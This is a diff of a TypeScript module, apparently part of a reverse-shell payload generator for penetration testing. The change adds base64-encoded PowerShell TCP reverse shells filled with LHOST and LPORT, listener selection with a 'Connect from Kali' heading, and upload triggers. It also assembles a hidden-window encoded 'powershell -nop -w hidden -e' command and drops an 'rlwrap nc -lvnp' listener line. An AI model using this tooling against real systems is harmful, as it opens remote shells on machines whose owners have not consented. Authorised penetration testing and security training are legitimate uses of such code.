@@ -1,40 +1,76 @@
 import { utf16leBase64 } from "./encode";
 import { wrapForContext, type PasteContext } from "./context";
-import type { BuiltPayload, PayloadDef } from "./types";
+import { fillListener, LISTENERS } from "./listeners";
+import { POWERSHELL_TCP } from "./psScripts";
+import type { BuiltPayload, ListenerId, PayloadDef } from "./types";
 
 const PLACEHOLDER = /\{([A-Z][A-Z0-9_]*)\}/g;
-const FALLBACK_LISTENER = "rlwrap nc -lvnp";
 /** The web server for a served file: 80, or 8000 when the listener takes 80, so the two never clash. */
 const ALT_SERVE_PORT = "8000";
 
 /**
- * Tokens worked out from the others, never typed and never unresolved: SERVE_PORT (the web server's port) and
- * WEB_PORT (":8000" in the cradle URL when the server moved off 80, else nothing).
+ * Tokens worked out from the others, never typed and never unresolved themselves: SERVE_PORT (the web server's port),
+ * WEB_PORT (":8000" in the cradle URL when the server moved off 80, else nothing) and PS_B64 (UTF-16LE base64 of
+ * POWERSHELL_TCP with LHOST and LPORT filled; while either is blank it stays {PS_B64} and that one is unresolved).
  */
-export const DERIVED_TOKENS = new Set(["SERVE_PORT", "WEB_PORT"]);
+export const DERIVED_TOKENS = new Set(["SERVE_PORT", "WEB_PORT", "PS_B64"]);
+
+/** Trimmed from both ends of UPLOAD_PATH, so "/uploads/" and "uploads" fill the same. */
+const trimPath = (p: string) => p.replace(/^[\s/]+|[\s/]+$/g, "");
+
+export interface BuildOptions {
+  /** The OS a def with os "any" is wrapped for (default linux). */
+  os?: "linux" | "windows";
+  /** Used when it is in def.listeners; otherwise def.listeners[0]. */
+  listener?: ListenerId;
+}
 
 /** Fills the placeholders and wraps the result so it works as pasted in `ctx`. */
-export function buildPayload(def: PayloadDef, ctx: PasteContext, values: Record<string, string>): BuiltPayload {
-  const unresolved: string[] = [];
+export function buildPayload(
+  def: PayloadDef, ctx: PasteContext, values: Record<string, string>, opts: BuildOptions = {},
+): BuiltPayload {
   const value = (name: string): string | null => {
     const given = (values[name] ?? "").trim();
-    const v = given !== "" ? given : (def.defaults?.[name] ?? "").trim();
+    let v = given !== "" ? given : (def.defaults?.[name] ?? "").trim();
+    if (name === "UPLOAD_PATH") v = trimPath(v);
     return v === "" ? null : v;
   };
-  const moved = value("LPORT") === "80";
+  const lhost = value("LHOST");
+  const lport = value("LPORT");
+  const moved = lport === "80";
+  const psB64 = lhost !== null && lport !== null
+    ? utf16leBase64(POWERSHELL_TCP.replace("{LHOST}", lhost).replace("{LPORT}", lport))
+    : null;
   const derived: Record<string, string> = { SERVE_PORT: moved ? ALT_SERVE_PORT : "80", WEB_PORT: moved ? `:${ALT_SERVE_PORT}` : "" };
-  const fill = (template: string) => template.replace(PLACEHOLDER, (m, name: string) => {
-    if (DERIVED_TOKENS.has(name)) return derived[name]!;
-    const v = value(name);
-    if (v === null) {
-      if (!unresolved.includes(name)) unresolved.push(name);
-      return m;
-    }
-    return v;
-  });
+  const filler = (unresolved: string[]) => {
+    const miss = (name: string) => { if (!unresolved.includes(name)) unresolved.push(name); };
+    return (template: string) => template.replace(PLACEHOLDER, (m, name: string) => {
+      if (name === "PS_B64") {
+        if (psB64 !== null) return psB64;
+        if (lhost === null) miss("LHOST");
+        if (lport === null) miss("LPORT");
+        return m;
+      }
+      if (DERIVED_TOKENS.has(name)) return derived[name]!;
+      const v = value(name);
+      if (v === null) {
+        miss(name);
+        return m;
+      }
+      return v;
+    });
+  };
+  const unresolved: string[] = [];
+  const fill = filler(unresolved);
   const filled = fill(def.template);
   const prepareLines = [def.prepare, def.serve].filter((l): l is string => !!l).map(fill);
   const prepare = prepareLines.length > 0 ? prepareLines.join("\n") : null;
+
+  let trigger: BuiltPayload["trigger"] = null;
+  if (def.upload) {
+    const triggerUnresolved: string[] = [];
+    trigger = { text: filler(triggerUnresolved)(def.upload.trigger), unresolved: triggerUnresolved };
+  }
 
   const notes: string[] = [...(def.notes ?? [])];
   let text: string;
@@ -46,17 +82,23 @@ export function buildPayload(def: PayloadDef, ctx: PasteContext, values: Record<
     notes.push(`Set ${unresolved.join(", ")} first: the payload is not wrapped for ${ctx} until it is.`);
   } else {
     const raw = def.encodePowerShell ? `powershell -nop -w hidden -e ${utf16leBase64(filled)}` : filled;
-    const wrapped = wrapForContext(raw, ctx, def.os);
+    const wrapped = wrapForContext(raw, ctx, def.os === "any" ? (opts.os ?? "linux") : def.os);
     text = wrapped.text;
     notes.push(...wrapped.notes);
   }
   if (def.bakesIp) notes.push("LHOST and LPORT are baked into the served script: regenerate it if either changes.");
 
-  const port = value("LPORT") ?? "{LPORT}";
+  const listenerId = opts.listener && def.listeners.includes(opts.listener) ? opts.listener : (def.listeners[0] ?? null);
   let listener: string | null = null;
-  if (def.listener === "penelope") {
-    listener = `penelope -O -p ${port}`;
-    notes.push(`No penelope? ${FALLBACK_LISTENER} ${port}`);
+  let listenerHeading: BuiltPayload["listenerHeading"] = "Listener";
+  if (listenerId) {
+    const l = LISTENERS[listenerId];
+    const lv: Record<string, string> = {};
+    for (const name of ["LHOST", "LPORT", "TARGET_IP", "BIND_PORT"]) lv[name] = value(name) ?? "";
+    lv.MSF_PAYLOAD = def.msfPayload ?? "";
+    listener = fillListener(l.template, lv);
+    if (l.connect) listenerHeading = "Connect from Kali";
+    if (l.note) notes.push(fillListener(l.note, lv));
   }
-  return { def, text, listener, parts: def.parts, notes, unresolved, prepare };
+  return { def, text, listener, listenerId, listenerHeading, trigger, parts: def.parts, notes, unresolved, prepare };
 }
